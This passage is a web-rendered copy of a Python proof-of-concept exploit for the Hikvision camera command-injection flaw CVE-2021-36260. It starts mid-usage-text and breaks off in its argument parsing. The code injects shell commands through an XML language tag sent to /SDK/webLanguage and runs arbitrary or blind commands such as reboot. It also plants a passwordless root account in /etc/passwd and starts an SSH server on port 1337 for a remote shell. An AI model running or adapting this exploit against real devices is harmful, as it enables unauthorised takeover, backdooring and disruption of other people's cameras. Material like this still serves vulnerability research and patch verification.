--rebootLaunch and connect to SSH shell:    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --shellExecute command:    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd "ls -l"Execute blind command:    $./CVE-2021-36260.py --rhost 192.168.57.20 --rport 8080 --cmd_blind "reboot"$./CVE-2021-36260.py -h[*] Hikvision CVE-2021-36260[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)usage: CVE-2021-36260.py [-h] --rhost RHOST [--rport RPORT] [--check]                         [--reboot] [--shell] [--cmd CMD]                         [--cmd_blind CMD_BLIND] [--noverify]                         [--proto {http,https}]optional arguments:  -h, --help            show this help message and exit  --rhost RHOST         Remote Target Address (IP/FQDN)  --rport RPORT         Remote Target Port  --check               Check if vulnerable  --reboot              Reboot if vulnerable  --shell               Launch SSH shell  --cmd CMD             execute cmd (i.e: "ls -l")  --cmd_blind CMD_BLIND                        execute blind cmd (i.e: "reboot")  --noverify            Do not verify if vulnerable  --proto {http,https}  Protocol used$"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> argparse<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> requests <span class="token keyword">import</span> packages<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages <span class="token keyword">import</span> urllib3<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3 <span class="token keyword">import</span> exceptions<span class="token keyword">class</span> <span class="token class-name">Http</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> rhost<span class="token punctuation">,</span> rport<span class="token punctuation">,</span> proto<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Http<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>rhost <span class="token operator">=</span> rhost        self<span class="token punctuation">.</span>rport <span class="token operator">=</span> rport        self<span class="token punctuation">.</span>proto <span class="token operator">=</span> proto        self<span class="token punctuation">.</span>timeout <span class="token operator">=</span> timeout        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>uri <span class="token operator">=</span> <span class="token boolean">None</span>        <span class="token triple-quoted-string string">""" Most devices will use self-signed certificates, suppress any warnings """</span>        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_init_uri<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>            <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>            <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'*/*'</span><span class="token punctuation">,</span>            <span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">,</span>            <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded; charset=UTF-8'</span><span class="token punctuation">,</span>            <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>            <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en-US,en;q=0.9,sv;q=0.8'</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">"""        self.remote.proxies.update({            # 'http': 'http://127.0.0.1:8080',        })        """</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> query_args<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">"""Some devices can handle more, others less, 22 bytes seems like a good compromise"""</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>query_args<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">22</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[!] Error: Command "</span><span class="token interpolation"><span class="token punctuation">{</span>query_args<span class="token punctuation">}</span></span><span class="token string">" to long (</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>query_args<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token triple-quoted-string string">"""This weird code will try automatically switch between http/https        and update Host        """</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'/SDK/webLanguage'</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>proto <span class="token operator">=</span> <span class="token string">'https'</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">==</span> <span class="token string">'http'</span> <span class="token keyword">else</span> <span class="token string">'https'</span>            self<span class="token punctuation">.</span>_init_uri<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>                    <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'/SDK/webLanguage'</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>        <span class="token triple-quoted-string string">"""302 when requesting http on https enabled device"""</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>            redirect <span class="token operator">=</span> data<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Location'</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>uri <span class="token operator">=</span> redirect<span class="token punctuation">[</span><span class="token punctuation">:</span>redirect<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            self<span class="token punctuation">.</span>_update_host<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> url <span class="token keyword">and</span> <span class="token keyword">not</span> query_args<span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> self<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">'/SDK/webLanguage'</span><span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>        <span class="token keyword">return</span> data    <span class="token keyword">def</span> <span class="token function">_update_host</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Host'</span><span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>uri<span class="token punctuation">[</span>self<span class="token punctuation">.</span>uri<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'://'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>                <span class="token string">'Host'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>uri<span class="token punctuation">[</span>self<span class="token punctuation">.</span>uri<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">'://'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_init_uri</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>uri <span class="token operator">=</span> <span class="token string">'{proto}://{rhost}:{rport}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>proto<span class="token operator">=</span>self<span class="token punctuation">.</span>proto<span class="token punctuation">,</span> rhost<span class="token operator">=</span>self<span class="token punctuation">.</span>rhost<span class="token punctuation">,</span> rport<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query_args<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Command injection in the &lt;language&gt; tag"""</span>        query_args <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;'</span> \                     <span class="token string-interpolation"><span class="token string">f'&lt;language&gt;$(</span><span class="token interpolation"><span class="token punctuation">{</span>query_args<span class="token punctuation">}</span></span><span class="token string">)&lt;/language&gt;'</span></span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>put<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uri <span class="token operator">+</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>query_args<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>uri <span class="token operator">+</span> url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    status_code == 200 (OK);        Verified vulnerable and exploitable    status_code == 500 (Internal Server Error);        Device may be vulnerable, but most likely not        The SDK webLanguage tag is there, but generate status_code 500 when language not found        I.e. Exist: &lt;language&gt;en&lt;/language&gt; (200), not exist: &lt;language&gt;EN&lt;/language&gt; (500)        (Issue: Could also be other directory than 'webLib', r/o FS etc...)    status_code == 401 (Unauthorized);        Defiantly not vulnerable    """</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>noverify<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Not verifying remote "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Checking remote "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[-] Cannot establish connection to "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[i] ETag:'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ETag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'&gt;webLib/c'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[-] "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">" do not looks like Hikvision'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    status_code <span class="token operator">=</span> data<span class="token punctuation">.</span>status_code    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'/c'</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""We could not verify command injection"""</span>        <span class="token keyword">if</span> status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[-] Could not verify if vulnerable (Code: </span><span class="token interpolation"><span class="token punctuation">{</span>status_code<span class="token punctuation">}</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>reboot<span class="token punctuation">:</span>                <span class="token keyword">return</span> check_reboot<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[+] Remote is not vulnerable (Code: </span><span class="token interpolation"><span class="token punctuation">{</span>status_code<span class="token punctuation">}</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] Remote is verified exploitable'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">check_reboot</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    We sending 'reboot', wait 2 sec, then checking with GET request.    - if there is data returned, we can assume remote is not vulnerable.    - If there is no connection or data returned, we can assume remote is vulnerable.    """</span>    <span class="token keyword">if</span> args<span class="token punctuation">.</span>check<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[i] Checking if vulnerable with "reboot"'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Checking remote "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rport<span class="token punctuation">}</span></span><span class="token string">" with "reboot"'</span></span><span class="token punctuation">)</span>    remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'reboot'</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[!] Remote is vulnerable'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Remote is not vulnerable'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">}</span></span><span class="token string">&gt;webLib/x'</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'/x'</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[!] Error execute cmd "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">cmd_blind</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Blind command injection    """</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> <span class="token keyword">not</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[-] Error execute cmd "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[i] Try execute blind cmd "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>cmd_blind<span class="token punctuation">}</span></span><span class="token string">"'</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check<span class="token punctuation">(</span>remote<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'/N'</span><span class="token punctuation">,</span> query_args<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[i] Remote "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">" not pwned, pwning now!'</span></span><span class="token punctuation">)</span>        data <span class="token operator">=</span> remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'echo -n P::0:0:W&gt;N'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'echo :/:/bin/sh&gt;&gt;N'</span><span class="token punctuation">)</span>        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'cat N&gt;&gt;/etc/passwd'</span><span class="token punctuation">)</span>        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'dropbear -R -B -p 1337'</span><span class="token punctuation">)</span>        remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>query_args<span class="token operator">=</span><span class="token string">'cat N&gt;webLib/N'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[i] Remote "</span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string">" already pwned'</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[*] Trying SSH to </span><span class="token interpolation"><span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span></span><span class="token string"> on port 1337'</span></span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>f'stty echo<span class="token punctuation">;</span> stty iexten<span class="token punctuation">;</span> stty icanon<span class="token punctuation">;</span> \    ssh <span class="token operator">-</span>o StrictHostKeyChecking<span class="token operator">=</span>no <span class="token operator">-</span>o LogLevel<span class="token operator">=</span>error <span class="token operator">-</span>o UserKnownHostsFile<span class="token operator">=</span><span class="token operator">/</span>dev<span class="token operator">/</span>null \    P@<span class="token punctuation">{</span>args<span class="token punctuation">.</span>rhost<span class="token punctuation">}</span> <span class="token operator">-</span>p <span class="token number">1337</span>'<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[*] Hikvision CVE-2021-36260\n[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)'</span><span class="token punctuation">)</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--rhost'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Remote Target Address (IP/FQDN)'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--rport'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Remote Target Port'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--check'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Check if vulnerable'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--reboot'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> action<span 